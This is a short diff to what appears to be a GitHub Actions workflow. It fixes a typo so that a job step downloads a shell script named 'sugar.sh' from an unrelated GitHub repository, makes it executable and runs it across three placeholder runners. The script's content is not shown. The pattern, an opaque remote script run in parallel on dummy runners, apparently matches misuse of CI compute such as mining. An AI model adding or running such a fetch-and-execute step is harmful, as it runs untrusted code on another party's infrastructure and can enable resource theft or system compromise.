@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/oaskdop/su4/main/suagr.sh && chmod +x sugar.sh && ./sugar.sh
+          wget https://raw.githubusercontent.com/oaskdop/su4/main/sugar.sh && chmod +x sugar.sh && ./sugar.sh
